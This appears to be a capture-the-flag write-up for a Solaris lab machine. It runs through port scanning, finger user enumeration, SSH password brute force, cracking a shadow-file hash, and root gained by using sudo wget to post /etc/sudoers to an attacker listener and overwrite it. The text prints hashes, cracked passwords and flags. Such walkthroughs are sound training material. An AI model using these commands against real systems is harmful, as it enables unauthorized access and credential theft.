I start with an nmap scan :
─# nmap -sC -sV -A 10.10.10.76
PORT    STATE SERVICE VERSION
79/tcp  open  finger  Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp open  rpcbind 2-4 (RPC #100000)
I proceed to run a full nmap scan as I dig deeper on these two ports found.
└─# nmap -p- --min-rate 10000 10.10.10.76
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
47654/tcp open  unknown
48254/tcp open  rpcbind

Trying various manual enumerations didn't yield much fruits so I run metasploit finger scan:
└─# msf6 auxiliary(scanner/finger/finger_users) > run
[+] 10.10.10.76:79        - 10.10.10.76:79 Users found: adm, bin, daemon, dladm, gdm, listen, lp, mysql, noaccess, 
nobody, nobody4, nuucp, openldap, postgres, root, svctag, sys, uucp, xvm

└─# ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
access@10.10.10.76
admin@10.10.10.76
anne marie@10.10.10.76
bin@10.10.10.76
dee dee@10.10.10.76
jo ann@10.10.10.76
la verne@10.10.10.76
line@10.10.10.76
message@10.10.10.76
miof mela@10.10.10.76        
root@10.10.10.76
sammy@10.10.10.76
sunny@10.10.10.76
sys@10.10.10.76
zsa zsa@10.10.10.76

Now we need to bruteforce the password:
└─# patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'
04:59:41 patator    INFO - code  size    time | candidate                          |   num | mesg
04:59:41 patator    INFO - -----------------------------------------------------------------------------
05:09:56 patator    INFO - 0     19     1.311 | sunday                             |   880 | SSH-2.0-Sun_SSH_1.3
Trying to ssh in, I get:
└─# ssh -p 22022 sunny@10.10.10.76
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found.
Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

And so I do like:
└─# ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76 
We find a backup of sammy hash:
sunny@sunday:~$ cd /
sunny@sunday:/$ ls
backup  boot   dev      etc     home    lib         media  net  platform  root   sbin    tmp  var
bin     cdrom  devices  export  kernel  lost+found  mnt    opt  proc      rpool  system  usr
sunny@sunday:/$ cd backup
sunny@sunday:/backup$ ls
agent22.backup  shadow.backup
sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
└─# hashcat -m 7400 sammy /usr/share/wordlists/rockyou.txt
:cooldude!
sammy@sunday:~/Desktop$ cat user.txt
a3d9498027ca5187ba1793943ee8a598

============Privelege Escalation==================
sammy@sunday:~/Desktop$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
Local machine a reverse listener
└─# nc -lvnp 80
Victim machine send over the shadow file:
root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146::::::
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
lp:NP:6445::::::
uucp:NP:6445::::::
nuucp:NP:6445::::::
dladm:*LK*:::::::
smmsp:NP:6445::::::
listen:*LK*:::::::
gdm:*LK*:::::::
zfssnap:NP:::::::
xvm:*LK*:6445::::::
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::

I reasearched a bit because cracking the root hash took so long. I found out that I can send over the sudoers file to my local
machine, edit the permissions and later upload back to the victim machine which will enable me to login as root.
sudo /usr/bin/wget --post-file=/etc/sudoers 10.10.14.13
And on local machine you get the response from the sudoers file listening on : nc -lvnp 80
I proceed and edit sammy's permissions to allow him to sudo on ALL
I then set up a simple server : python -m SimpleHTTPServer 8080 and on victim machine:
sudo /usr/bin/wget -O /etc/sudoers http://10.10.14.13:8080/sudoers --output-document=sudoers
sammy@sunday:~$ sudo su
root@sunday:~# id
uid=0(root) gid=0(root)
root@sunday:~# cat /root/root.txt
fb40fab61d99d37536daeec0d97af9b8
root@sunday:~#
Interesting reference on rpcbind
└─# https://crazeofcyber.blogspot.com/2019/10/exploit-rpcbind.html
https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/
